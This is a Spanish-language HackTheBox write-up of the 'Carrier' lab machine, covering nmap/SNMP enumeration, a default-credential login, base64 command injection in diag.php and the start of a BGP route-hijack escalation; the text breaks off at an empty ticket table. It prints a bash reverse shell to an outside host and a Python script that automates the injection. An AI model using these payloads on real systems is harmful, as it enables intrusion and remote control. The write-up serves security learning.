---
title: "HTB write-up: Carrier"
date: 2019-03-15T18:48:05-06:00
description: "¿Qué pasa cuando el de virtualización configura los routers virtuales? Exactamente eso parece que paso en Carrier"
tags: ["hackthebox", "htb", "boot2root", "pentesting", "bgp", "route leak"]
categories: ["htb", "pentesting"]

---

Route leaks and hijacks! Con Carrier realice algo que conocía de concepto, pero que nunca había intentado antes.
<!--more-->

# Machine info
La información que tenemos de la máquina es:

| Name | Maker | OS  | IP Address |
| ---- | ----- | --- | ---------- |
| ![carrier image](https://www.hackthebox.eu/storage/avatars/351d15764c8f183dba633cda9ebead4b_thumb.png) [carrier](https://www.hackthebox.eu/home/machines/profile/155) | [snowscan](https://www.hackthebox.eu/home/users/profile/9267) | Linux | 10.10.10.105 |

Su tarjeta de presentación es:

![cardinfo](/img/htb-carrier/cardinfo.png)


# Port Scanning

Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:

``` text
root@laptop:~# nmap -sS -p- --open -n -v 10.10.10.105
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-31 11:21 CST
Initiating Ping Scan at 11:21
Scanning 10.10.10.105 [4 ports]
Completed Ping Scan at 11:21, 0.43s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:21
Scanning 10.10.10.105 [65535 ports]
Discovered open port 22/tcp on 10.10.10.105
Discovered open port 80/tcp on 10.10.10.105
SYN Stealth Scan Timing: About 24.17% done; ETC: 11:24 (0:01:37 remaining)
Completed SYN Stealth Scan at 11:23, 112.94s elapsed (65535 total ports)
Nmap scan report for 10.10.10.105
Host is up (0.22s latency).
Not shown: 62027 closed ports, 3506 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 113.54 seconds
           Raw packets sent: 127330 (5.602MB) | Rcvd: 106742 (4.270MB)
```

- `-sS` para escaneo TCP vía SYN
- `-p-` para todos los puertos TCP
- `--open` para que solo me muestre resultados de puertos abiertos
- `-n` para no ejecutar resoluciones
- `-v` para modo *verboso*

Corroboremos con `masscan`:

``` text
root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.105

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-12-31 19:25:54 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 80/tcp on 10.10.10.105
Discovered open port 22/tcp on 10.10.10.105
```

- `-e tun0` para ejecutarlo nada mas en la interface tun0
- `-p0-65535,U:0-65535` TODOS los puertos (TCP y UDP)
- `--rate 500` para mandar 500pps y no sobre cargar la VPN ):

Como podemos ver los puertos son los mismos, por lo que iniciamos por identificar los servicios nuevamente con `nmap`.

# Services Identification

Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):

``` text
root@laptop:~# nmap -sS -Pn -sC -sV -p80,22 10.10.10.105 -n -v
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-31 13:35 CST
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:35
Completed NSE at 13:35, 0.00s elapsed
Initiating NSE at 13:35
Completed NSE at 13:35, 0.00s elapsed
Initiating SYN Stealth Scan at 13:35
Scanning 10.10.10.105 [2 ports]
Discovered open port 80/tcp on 10.10.10.105
Discovered open port 22/tcp on 10.10.10.105
Completed SYN Stealth Scan at 13:35, 0.43s elapsed (2 total ports)
Initiating Service scan at 13:35
Scanning 2 services on 10.10.10.105
Completed Service scan at 13:35, 6.48s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.105.
Initiating NSE at 13:35
Completed NSE at 13:35, 5.45s elapsed
Initiating NSE at 13:35
Completed NSE at 13:35, 0.00s elapsed
Nmap scan report for 10.10.10.105
Host is up (0.23s latency).

PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
80/tcp open  http       Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login

NSE: Script Post-scanning.
Initiating NSE at 13:35
Completed NSE at 13:35, 0.00s elapsed
Initiating NSE at 13:35
Completed NSE at 13:35, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.07 seconds
           Raw packets sent: 2 (88B) | Rcvd: 2 (88B)
```

- `-sC` para que ejecute los scripts safe-discovery de nse
- `-sV` para que me traiga el banner del puerto
- `-sS` para escaneo TCP vía SYN
- `-p80,22` para unicamente los puertos TCP/22 y TCP/80
- `-Pn` para que no le envié una prueba de ICMP
- `-n` para no ejecutar resoluciones
- `-v` para modo *verboso*

Concluimos que tenemos un puerto HTTP con Apache 2.4.18 sobre Ubuntu (eso dice el banner), que no hizo dirección ni nada raro. El puerto 22 se ve raro como tcpwrapped, pero eso tiene su motivo que veremos después, al menos les confirmo que hay un servidor de SSH detrás.

# Gobuster

Vamos a lanzar un amigable gobuster sobre el puerto TCP/80 de carrier:

``` text
xbytemx@laptop:~/tools$ ./gobuster -u 10.10.10.105 -w ~/git/payloads/owasp/dirbuster/directory-list-lowercase-2.3-medium.txt -s '200,204,301,302,307,403,500' -t 20 -x php,txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.105/
[+] Threads      : 20
[+] Wordlist     : /home/xbytemx/git/payloads/owasp/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403,500
[+] Extensions   : php,txt
[+] Timeout      : 10s
=====================================================
2019/01/02 12:10:20 Starting gobuster
=====================================================
/index.php (Status: 200)
/img (Status: 301)
/tools (Status: 301)
/doc (Status: 301)
/css (Status: 301)
/js (Status: 301)
/tickets.php (Status: 302)
/fonts (Status: 301)
/dashboard.php (Status: 302)
/debug (Status: 301)
/diag.php (Status: 302)
```

- `-u 10.10.10.105` para indicarle la URL sobre la cual buscara directorios o archivos
- `-w common.txt` para el diccionario en el cual se encuentran los archivos mas comunes a buscar
- `-s '200,204,301,302,307,403,500'` para aceptar los tipos de Status codes como respuesta valida
- `-x php,txt` para no solo buscar carpetas, sino archivos con esa extensión usando el mismo diccionario
- `-t 20` para indicar cuantos hilos estaremos usando para buscar

Tenemos varias respuestas interesantes, algunos directorios, un archivo index y en general con que investigar que tenemos entre manos.

# Discovery over HTTP

Ya que hemos sacado algunas carpetas y archivos, usemos `httpie` para ver que pasa por aca:

``` html
xbytemx@laptop:~/tools$ http 10.10.10.105/
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 602
Content-Type: text/html; charset=UTF-8
Date: Wed, 02 Jan 2019 00:58:36 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Keep-Alive: timeout=5, max=100
Pragma: no-cache
Server: Apache/2.4.18 (Ubuntu)
Set-Cookie: PHPSESSID=jvbu0mhj4ldsvsjuhirjg6s1n1; path=/
Vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>Login</title>

    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">

  </head>
  <body>

    <div class="container-fluid">
        <div class="row">
                <div class="col-md-4">
                </div>
                <div class="col-md-4">
                        <div class="text-center">
                                <img alt="Lyghtspeed" src="img/logo.png">
                        </div>
                        <div class="page-header text-center">
                                <h4>
                                        Please login
                                </h4>
                                <span class="badge badge-danger">Error 45007</span><br>
                                <span class="badge badge-danger">Error 45009</span>
                                                      </div>
                        <form role="form" method="post">
                                <div class="form-group">

                                        <label for="Username">
                                                Username
                                        </label>
                                        <input type="username" class="form-control" id="Username" name="username">
                                </div>
                                <div class="form-group">

                                        <label for="Password">
                                                Password
                                        </label>
                                        <input type="password" class="form-control" id="Password" name="password">
                                </div>
                                <div class="text-center">
                                        <button type="submit" class="btn btn-primary">
                                                Submit
                                        </button>
                                </div>
                        </form>
                </div>
                <div class="col-md-4">
                </div>
        </div>
</div>

    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/scripts.js"></script>
  </body>
</html>
```

Como podemos observar, tenemos una pantalla de login y unos códigos extraños en la parte superior:

``` html
<span class="badge badge-danger">Error 45007</span><br>
<span class="badge badge-danger">Error 45009</span>
```

Tambien y no menos importante una cookie, lo cual nos indica que para la autenticación/sesión estaremos usando cookies.

Revisemos en la carpeta doc que nos pudo encontrar gobuster:

``` html
xbytemx@laptop:~/tools$ http 10.10.10.105/doc/
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 498
Content-Type: text/html;charset=UTF-8
Date: Wed, 02 Jan 2019 00:54:44 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /doc</title>
 </head>
 <body>
<h1>Index of /doc</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="diagram_for_tac.png">diagram_for_tac.png</a></td><td align="right">2018-07-02 20:46  </td><td align="right"> 35K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/layout.gif" alt="[   ]"></td><td><a href="error_codes.pdf">error_codes.pdf</a></td><td align="right">2018-07-02 18:11  </td><td align="right"> 70K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.105 Port 80</address>
</body></html>
```

Descargamos los archivos de directorio DOC y encontramos que error\_codes y diagram\_for\_tac nos indican mas información sobre la maquina:

``` text
CW1000-X Lyghtspeed Management Platform v1.0.4d(Rel 1. GA)
Error messages list

Table A1 - Main error codes for CW1000-X management platform
---
45007 | License invalid or expired
45009 | System credentials have not been set
        Default admin user password is set (see chassis serial number)
```

El diagrama nos indica que Zaza Telecom tiene el AS 200, CastCom tiene el AS 300 y **Lyghtspeed Networks tiene el AS 100**. La misma de la pagina de login.

# Discovery of a SNMP

Si, también me paso como otros que me confié de mis primeros resultados y llegue a un callejón sin salida. Gracias a un hit volví a lanzar el escaneo en UDP:

``` text
root@laptop:~# nmap -sU 10.10.10.105 -n -v --open -T4
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-02 10:37 CST
Initiating Ping Scan at 10:37
Scanning 10.10.10.105 [4 ports]
Completed Ping Scan at 10:37, 0.44s elapsed (1 total hosts)
Initiating UDP Scan at 10:37
Scanning 10.10.10.105 [1000 ports]
Completed UDP Scan at 10:55, 1097.33s elapsed (1000 total ports)
Nmap scan report for 10.10.10.105
Host is up (0.26s latency).
Not shown: 969 closed ports, 26 open|filtered ports, 4 filtered ports
PORT    STATE SERVICE
161/udp open  snmp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1097.89 seconds
           Raw packets sent: 1672 (48.101KB) | Rcvd: 1148 (71.675KB)

root@laptop:~# nmap -A -T4 -sU -p161 10.10.10.105
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-02 11:45 CST
Nmap scan report for 10.10.10.105
Host is up (0.19s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; pysnmp SNMPv3 server (public)
| snmp-info:
|   enterprise: pysnmp
|   engineIDFormat: octets
|   engineIDData: 776562020a1908
|   snmpEngineBoots: 2
|_  snmpEngineTime: 39m48s
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops

TRACEROUTE (using port 161/udp)
HOP RTT       ADDRESS
1   188.42 ms 10.10.12.1
2   185.49 ms 10.10.10.105

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.21 seconds
```

Como podemos ver, nmap nos devuelve que el puerto UDP/161 se encuentra abierto y con SNMP ejecutándose. Es mas, hasta la comunidad public para todos!

# snmpwalk

Realizamos un snmpwalk sobre el servidor con la comunidad public como target:

``` bash
xbytemx@laptop:~$ snmpwalk -v1 -c public 10.10.10.105
iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
End of MIB
```

Excelente! ahora tenemos el numero de serie del equipo! Si recordamos la información anterior, el equipo se encuentra con credenciales por defecto, donde el pass de admin es el numero de serie.

> creds: admin / NET_45JDX23

# Login

Usamos las credenciales que hemos obtenido para ingresar en la aplicación:

``` text
xbytemx@laptop:~$ http --form 10.10.10.105 username=admin password=NET_45JDX23
HTTP/1.1 302 Found
Cache-Control: no-store, no-cache, must-revalidate
Connection: Keep-Alive
Content-Length: 0
Content-Type: text/html; charset=UTF-8
Date: Wed, 02 Jan 2019 16:47:49 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Keep-Alive: timeout=5, max=100
Location: /dashboard.php
Pragma: no-cache
Server: Apache/2.4.18 (Ubuntu)
Set-Cookie: PHPSESSID=dl2rd6kd8mrffdg0r3vlp1r8p0; path=/
```

Nos redirige a la pagina de `/dashboard.php`, la cual si recordamos descubrimos via `gobuster`. Estuve aburridamente revisando otras partes de la aplicación hasta que me tope con un POST.

Veamos el contenido de  **diag.php**.

``` html
xbytemx@laptop:~$ http --form http://10.10.10.105/diag.php "Cookie: PHPSESSID=0pe9hk302pnup5s84e9984gd24; path=/" check=cXVhZ2dh
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 820
Content-Type: text/html; charset=UTF-8
Date: Wed, 02 Jan 2019 18:32:43 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Keep-Alive: timeout=5, max=100
Pragma: no-cache
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>Diagnostics</title>

    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">

  </head>
  <body>

    <div class="container-fluid">
        <div class="row">
                <div class="col-md-2">
                </div>
                <div class="col-md-8">
                        <br>
                        <img alt="Lyghtspeed" src="img/logo.png">
                        <br><br>
                        <ul class="nav nav-pills">
                                <li class="nav-item">
                                        <a class="nav-link" href="/dashboard.php">Dashboard</a>
                                </li>
                                <li class="nav-item">
                                        <a class="nav-link" href="/tickets.php">Tickets</a>
                                </li>
                                <li class="nav-item">
                                        <a class="nav-link disabled" href="#">Monitoring</a>
                                </li>
                                <li class="nav-item">
                                        <a class="nav-link active" href="/diag.php">Diagnostics</a>
                                </li>
                        </ul>
                        <br>
                        <div>
                                <p>Warning: Invalid license, diagnostics restricted to built-in checks</p>
                                <form role="form" method="post">
                                        <input type="hidden" id="check" name="check" value="cXVhZ2dh">
                                        <div class="form-group">
                                                <button type="submit" class="btn btn-primary">
                                                        Verify status
                                                </button>
                                        </div>
                                </form>
                        </div>
                        <div>
                        <p>quagga     1026  0.0  0.1  24500  2356 ?        Ss   18:30   0:00 /usr/lib/quagga/zebra --daemon -A 127.0.0.
1</p><p>quagga     1030  0.0  0.1  29444  3860 ?        Ss   18:30   0:00 /usr/lib/quagga/bgpd --daemon -A 127.0.0.1</p><p>root       1
035  0.0  0.0  15432   168 ?        Ss   18:30   0:00 /usr/lib/quagga/watchquagga --daemon zebra bgpd</p>                       </div>
                <div class="col-md-2">
                </div>
        </div>
</div>

    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/scripts.js"></script>
  </body>
</html>
```

Espera, a ese pokemon lo he visto antes. Así es, la salida de un `ps`. Esa variable check, suena sospechosa y también conocida, vemos si la podemos decodear:

``` text
xbytemx@laptop:~$ printf "cXVhZ2dh" | base64 -d
quagga
```

# Command injection

Así que el parámetro que recibía `diag.php` via POST fue `quagga`. Esto huele a command injection. Preparemos con sustitución algunas cosas:

``` html
xbytemx@laptop:~$ http --form http://10.10.10.105/diag.php "Cookie: PHPSESSID=0pe9hk302pnup5s84e9984gd24; path=/" check=$(printf "quagga" | base64)
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 846
Content-Type: text/html; charset=UTF-8
Date: Wed, 02 Jan 2019 18:57:17 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Keep-Alive: timeout=5, max=100
Pragma: no-cache
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>Diagnostics</title>

    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">

  </head>
  <body>
    <div class="container-fluid">
        <div class="row">
                <div class="col-md-2">
                </div>
                <div class="col-md-8">
                        <br>
                        <img alt="Lyghtspeed" src="img/logo.png">
                        <br><br>
                        <ul class="nav nav-pills">
                                <li class="nav-item">
                                        <a class="nav-link" href="/dashboard.php">Dashboard</a>
                                </li>
                                <li class="nav-item">
                                        <a class="nav-link" href="/tickets.php">Tickets</a>
                                </li>
                                <li class="nav-item">
                                        <a class="nav-link disabled" href="#">Monitoring</a>
                                </li>
                                <li class="nav-item">
                                        <a class="nav-link active" href="/diag.php">Diagnostics</a>
                                </li>
                        </ul>
                        <br>
                        <div>
                                <p>Warning: Invalid license, diagnostics restricted to built-in checks</p>
                                <form role="form" method="post">
                                        <input type="hidden" id="check" name="check" value="cXVhZ2dh">
                                        <div class="form-group">
                                                <button type="submit" class="btn btn-primary">
                                                       Verify status
                                                </button>
                                        </div>
                                </form>
                        </div>
                        <div>
                        <p>quagga     2442  0.0  0.1  24500  2392 ?        Ss   18:50   0:00 /usr/lib/quagga/zebra --daemon -A 127.0.0.
1</p><p>root       2451  0.0  0.0  15432   168 ?        Ss   18:50   0:00 /usr/lib/quagga/watchquagga --daemon zebra bgpd</p><p>quagga
    2631  0.0  0.1  29320  3432 ?        Ss   18:57   0:00 /usr/lib/quagga/bgpd -f /etc/quagga/bgpd-01.conf -d -i /tmp/bgpd-01.pid</p><
/div>
                <div class="col-md-2">
                </div>
        </div>
</div>

    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/scripts.js"></script>
  </body>
</html>
```

Logre ejecutar de manera exitosa el mismo comando controlando el output. Veamos si se puede concatenar comandos con `;`

``` text
xbytemx@laptop:~$ http --form http://10.10.10.105/diag.php "Cookie: PHPSESSID=0pe9hk302pnup5s84e9984gd24; path=/" check=$(printf "quagga;ls" | base64)
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 960
Content-Type: text/html; charset=UTF-8
Date: Wed, 02 Jan 2019 18:58:20 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Keep-Alive: timeout=5, max=100
Pragma: no-cache
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>Diagnostics</title>

    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">

  </head>
  <body>
    <div class="container-fluid">
        <div class="row">
                <div class="col-md-2">
                </div>
                <div class="col-md-8">
                        <br>
                        <img alt="Lyghtspeed" src="img/logo.png">
                        <br><br>
                        <ul class="nav nav-pills">
                                <li class="nav-item">
                                        <a class="nav-link" href="/dashboard.php">Dashboard</a>
                                </li>
                                <li class="nav-item">
                                        <a class="nav-link" href="/tickets.php">Tickets</a>
                                </li>
                                <li class="nav-item">
                                        <a class="nav-link disabled" href="#">Monitoring</a>
                                </li>
                                <li class="nav-item">
                                        <a class="nav-link active" href="/diag.php">Diagnostics</a>
                                </li>
                        </ul>
                        <br>
                        <div>
                                <p>Warning: Invalid license, diagnostics restricted to built-in checks</p>
                                <form role="form" method="post">
                                        <input type="hidden" id="check" name="check" value="cXVhZ2dh">
                                        <div class="form-group">
                                                <button type="submit" class="btn btn-primary">
                                                        Verify status
                                                </button>
                                        </div>
                                </form>
                        </div>
                        <div>
                        <p>quagga     2442  0.0  0.1  24500  2392 ?        Ss   18:50   0:00 /usr/lib/quagga/zebra --daemon -A 127.0.0.
1</p><p>root       2451  0.0  0.0  15432   168 ?        Ss   18:50   0:00 /usr/lib/quagga/watchquagga --daemon zebra bgpd</p><p>quagga
    2631  0.0  0.1  29320  3432 ?        Ss   18:57   0:00 /usr/lib/quagga/bgpd -f /etc/quagga/bgpd-01.conf -d -i /tmp/bgpd-01.pid</p><
p>root       2804  0.0  0.1  11232  3020 ?        Ss   18:57   0:00 bash -c ps waux | grep quagga; bash rev.sh | grep -v grep</p><p>roo
t       2894  0.0  0.1  11232  3092 ?        Ss   18:58   0:00 bash -c ps waux | grep quagga;ls | grep -v grep</p><p>root       2896  0
.0  0.0  12944  1088 ?        S    18:58   0:00 grep quagga</p><p>rev.sh</p><p>rev.sh.1</p><p>test_intercept.pcap</p><p>user.txt</p>  <
/div>
                <div class="col-md-2">
                </div>
        </div>
</div>

    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/scripts.js"></script>
  </body>
</html>
```

Perfecto, al final aparece el ls del directorio $HOME del usuario.

> Se omite las peticiones HTTP por ser una replica de las peticiones anteriores.

# Reverse Shell, 1

Levantemos un listener del lado de mi máquina:

``` text
xbytemx@laptop:~$ ncat -lnvp 3001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::3001
Ncat: Listening on 0.0.0.0:3001
```

Ejecutemos una del arsenal para que el servidor se conecte a mi maquina y podamos interactuar con el STDIN y STDOUT de la maquina:

`bash -i >& /dev/tcp/10.10.15.126/3001 0>&1`

Concatenamos y lanzamos:

``` text
xbytemx@laptop:~$ http --form http://10.10.10.105/diag.php "Cookie: PHPSESSID=ld7k5a627mvs32ge9246tn2857; path=/" check=$(printf "quagga;bash -i >& /dev/tcp/10.10.15.126/3001 0>&1" | base64)
```

Esperamos que carrier se conecte hacia nosotros:

``` text
xbytemx@laptop:~$ ncat -lnvp 3001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::3001
Ncat: Listening on 0.0.0.0:3001
Ncat: Connection from 10.10.10.105.
Ncat: Connection from 10.10.10.105:53914.
bash: cannot set terminal process group (5515): Inappropriate ioctl for device
bash: no job control in this shell
root@r1:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```

Listo ya estamos dentro. Ahora tomemos la flag de user.txt

# `cat user.txt`
``` text
root@r1:~# cat user.txt
```

# Reverse Shell, 2

Como muchos saben, conectarse a cada rato puede resultar algo aburrido de hacer una y otra vez, es por ello que realice el siguiente script en python para que me conecte cada que sea necesario. El único requerimiento es tener un ncat escuchando en el puerto 3001.

``` python
#! /usr/bin/python

import requests,base64,netifaces

IP = netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
PORT = "3001"

payload="quagga; bash -i >& /dev/tcp/"+IP+"/"+PORT+" 0>&1"
encoded = base64.b64encode(payload)

session = requests.Session()
headers = {"Content-Type":"application/x-www-form-urlencoded"}

loginPost = {"username":"admin", "password":"NET_45JDX23"}
session.post("http://10.10.10.105/", data=loginPost, headers=headers)

diagPost = {"check":encoded}
session.post("http://10.10.10.105/diag.php", data=diagPost, headers=headers)
```

# PrivEsc

Como hemos podido observar hasta el momento, el diag del proceso quagga fue lo que básicamente nos permitió ingresar hasta el servidor, ¿pero qué es exactamente quagga? Simplificada mente, se trata del remplazo de zebra, que consistía en una implementación de daemons para OSPF, BGP, RIP, IS-IS para *nix que nos permitían subir a la `RIB table`. Aquí es donde hace sentido el diagrama de Sistemas Autónomos que obtuvimos antes:

![diagram for tac](/img/htb-carrier/diagram_for_tac.png)

Los carriers o ISP interactúan usando BGP para compartir información sobre el estado de sistemas autónomos (grupos de routers que comparten información de routing loop-free). En este caso tenemos que existe una interconexión de 3 sistemas autónomos, donde cada uno debe tener ciertos segmentos de red que anuncia sobre BGP.

Si miramos la tabla de enrutamiento aprendido por BGP, usando vtysh veremos lo siguiente:

``` text
BGP table version is 0, local router ID is 10.255.255.1
Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
              i internal, r RIB-failure, S Stale, R Removed
Origin codes: i - IGP, e - EGP, ? - incomplete

   Network          Next Hop            Metric LocPrf Weight Path
*> 10.78.10.0/24    0.0.0.0                  0         32768 ?
*> 10.78.11.0/24    0.0.0.0                  0         32768 ?
*> 10.99.64.0/24    0.0.0.0                  0         32768 ?
*  10.100.10.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.11.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.12.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.13.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.14.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.15.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.16.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.17.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.18.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.19.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.20.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*> 10.101.8.0/21    0.0.0.0                  0         32768 i
*> 10.101.16.0/21   0.0.0.0                  0         32768 i
*> 10.120.10.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.11.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.12.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.13.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.14.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.15.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.16.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.17.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.18.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.19.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.20.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
```

Con esto conocemos todas las redes aprendidas por BGP mediante los neighbors 10.78.10.2 (AS 200) y 10.78.11.2 (AS 300). Ah no puedo olvidar que nosotros anunciamos por defecto TODAS las interfaces directamente conectadas. Esto porque existe una redistribución vía route-map.

Un punto importante de observar, es que tenemos en la tabla redes que tienen el carácter `>`, que significa que es la activa actualmente, esto porque se genera un ECMP que se rompe por AS Path Distance, por eso también vemos que abajo se repite la red (cuando no muestra nada).

La configuración del router es la siguiente:

```cisco
!
! Zebra configuration saved from vty
!   2018/07/02 02:14:27
!
route-map to-as200 permit 10
route-map to-as300 permit 10
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 route-map to-as300 out
!
line vty
!
```

Ahora, tras revisar la configuración del router, no observaremos que exista algún mecanismo de autenticación que reserve la comunicación entre los peers, lo cual implica que ambos peers confían en mi.

Considerando el siguiente párrafo del sistema de tickets:

| \# | Status | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
|----|--------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
